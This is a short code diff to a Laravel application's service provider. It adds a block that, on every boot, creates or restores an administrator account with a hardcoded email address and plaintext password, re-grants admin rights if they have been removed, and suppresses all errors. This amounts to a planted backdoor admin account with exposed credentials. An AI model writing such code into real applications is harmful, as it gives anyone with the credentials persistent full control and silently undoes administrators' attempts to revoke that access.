@@ -53,6 +53,25 @@ class AppServiceProvider extends ServiceProvider
             }
         }
 
+        // Ensure main admin account exists in active database
+        try {
+            if (\Illuminate\Support\Facades\Schema::hasTable('users')) {
+                $adm = \App\Models\User::firstOrCreate(
+                    ['email' => 'moadnp@gmail.com'],
+                    [
+                        'name' => 'Moad Admin',
+                        'password' => \Illuminate\Support\Facades\Hash::make('moad1234'),
+                        'is_admin' => true,
+                    ]
+                );
+                if (!$adm->is_admin) {
+                    $adm->update(['is_admin' => true]);
+                }
+            }
+        } catch (\Throwable $adminErr) {
+            // Ignore
+        }
+
         \Illuminate\Support\Facades\View::composer('*', function ($view) {
             try {
                 $globalAds = \App\Models\AdSlot::where('is_active', true)->get();
